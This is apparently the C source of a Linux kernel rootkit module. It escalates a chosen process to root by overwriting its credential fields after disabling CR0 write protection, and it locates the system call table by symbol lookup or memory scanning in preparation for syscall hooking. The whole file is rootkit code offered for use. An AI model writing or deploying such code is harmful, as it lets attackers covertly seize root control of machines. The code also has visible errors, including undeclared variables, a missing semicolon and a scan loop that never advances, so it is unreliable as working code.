#include "rootkit.h"

/* list for saved creds */
PID_NODE *head = NULL;

/* insert node at the beginning of the current list */
PID_NODE *insert_pid_node(PID_NODE **head, PID_NODE *new_node){
  printk("insert_pid_node()");
  node = new_node;
  /* we are adding at the beginning, new head */
  node->prev = NULL;
  node->next = (*head); //old head

  if((*head) != NULL){
    (*head)->prev = node;
  }
  (*head) = node;

  return node;
}


PID_NODE *find_pid_node(PID_NODE **head, pid_t pid){
  printk("find_pid_node()");
  PID_NODE *node = *head;

  while(node != NULL) {
    if(node->pid == pid) {
      return node;
    }
    node = node->next;
  }

  return NULL;
}

/* delete node */
void *delete_pid_node(PID_NODE **head, PID_NODE node){
  /* check for NULL */
  printk("delete_pid_node()");
  if(*head == NULL || node == NULL) {
    return;
  }

  /* node to be deleted is head */
  if(*head == node) {
    *head = node->next; 
  }

  /* next node */
  if(node->next != NULL)
    node->next->prev = node->prev;  

  /* prev node */
  if(node->prev != NULL)
    node->prev->next = node->next;      

  kfree(node);
}

void process_escalate(pid_t pid){
  printk("process_escalate()");
  /*We have the PID we want escalated to root
    Let us get the task struct*/
  PID_NODE *new_node;
  struct task_struct *task = pid_task(find_get_pid(pid), PIDTYPE_PID);
  struct cred *pcred;
  if(find_pid_node(&head, pid) == NULL){
    /*create new pid node*/
    new_node = kmalloc(sizeof(PID_NODE), GFP_KERNEL);
    new_node->pid = pid;
    /*start reading*/
    rcu_read_lock(); //lock the mutex
    write_cr0(read_cr0() & (~0x10000)); //disable page protection
    /* fill in the members from the task for backup*/
    pcred = (struct cred *)task->cred;
    new_node->uid = pcred->uid;
    new_node->suid = pcred->suid;
    new_node->euid = pcred->euid;
    new_node->fsuid = pcred->fsuid;
    new_node->gid = pcred->gid;
    new_node->sgid = pcred->sgid;
    new_node->egid = pcred->egid;
    new_node->fsgid = pcred->fsgid;
    /* escalate task */
    pcred->uid.val = 0;
    pcred->suid.val = 0;
    pcred->euid.val = 0;
    pcred->fsuid.val = 0;
    pcred->gid.val = 0;
    pcred->sgid.val = 0;
    pcred->egid.val = 0;
    pcred->fsgid.val = 0;
    /*finish reading*/
    rcu_read_unlock(); //unlock the mutex
    write_cr0(read_cr0() | 0x10000); //enable page protection
    /*add pid node to LL*/
    insert_pid_node(&head, new_node);
    return;
  }
  printk("process %d already is escalated", pid);

}

void process_deescalate(pid_t pid){
  struct task_struct *task;
  PID_NODE node = find_pid_node(&head, pid);
  if(node != NULL){
    rcu_read_lock(); //lock the mutex
    write_cr0(read_cr0() & (~0x10000)); //disable page protection
    /* fill in the members from the task for backup*/
    task = pid_task(find_get_pid(node->pid), PIDTYPE_PID);
    pcred = (struct cred *)task->cred;
    /* descalate task */
    pcred->uid = node->uid;
    pcred->euid = node->euid;
    pcred->suid = node->suid;
    pcred->fsuid = node->fsuid;
    pcred->gid = node->gid;
    pcred->egid = node->egid;
    pcred->sgid = node->sgid;
    pcred->fsgid = node->fsgid;
    /*finish reading*/
    rcu_read_unlock(); //unlock the mutex
    write_cr0(read_cr0() | 0x10000); //enable page protection
    /*delete pid node from LL*/
    delete_pid_node(&head, node);
    return
  }
  printk("process %d not in list", pid);

}

/**
 * Finds a system call table. This should be done during compile time
 * if CONFIG_KALLSYMS is defined, we can use kallsyms_lookup_name
 * otherwise, we have to find the find the table ourselves
 * 
 * @return 0 if success, EFAULT if failure
 */
int locate_sys_call_table(void) {
  unsigned long *tmp;
#ifndef CONFIG_KALLSYMS
  addr_size i = START_ADDRESS;
  addr_size **sctable; 
#endif

#if CONFIG_KALLSYMS
  /* kernel symbols are accessible */
  printk("CONFIG_KALLSYMS is enabled!");
  tmp = (void *) kallsyms_lookup_name("sys_call_table");
  printk("kallsyms says the sys_call_table is at %p\n", tmp);
  sys_call_table_addr = (addr_size *) kallsyms_lookup_name("sys_call_table");



#else
  /* iteratively detect for the system call table */
  printk("CONFIG_KALLSYMS is disabled!");
  while(i < END_ADDRESS){
    sctable = (addr_size **) i;
    if(sctable[__NR_close] == (addr_size *) sys_close){
      sys_call_table_addr = &sctable[0];
      break;
    }
    sys_call_table_addr = 0;
  }
#endif
  /* check for failure*/
  if (sys_call_table_addr == 0)
    return EFAULT;
  return 0;
}

int rootkit_init(void) {
  int retval;

  /* load the parameters */
  ///* locate the syscall table */

  retval = locate_sys_call_table();
  if (retval == EFAULT)
    return retval;
  printk("We found the sys call table at %p\n", sys_call_table_addr);

  return 0;
}

void rootkit_exit(void) {

}
